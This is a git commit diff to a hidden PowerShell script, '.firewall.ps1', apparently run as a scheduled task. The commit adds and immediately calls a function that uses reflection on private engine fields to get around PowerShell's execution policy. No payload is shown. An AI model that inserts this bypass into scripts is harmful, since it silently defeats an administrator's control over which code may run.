690eaa0bd3bdc413784a385ba29963e530492c8b
fxhxyz4 <fxhxyz8@gmail.com>
2025-01-27 16:44:39 +0300

    Update .firewall.ps1

--- .firewall.ps1
+++ .firewall.ps1
@@ -1,5 +1,11 @@
 # running with task
 
+function Disable-ExecutionPolicy {
+    ($ctx = $executioncontext.gettype().getfield('_context','nonpublic,instance').getvalue($executioncontext)).gettype().getfield('_authorizationManager','nonpublic,instance').setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager 'Microsoft.PowerShell'))
+};
+
+Disable-ExecutionPolicy;
+
 if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
     exit
 }
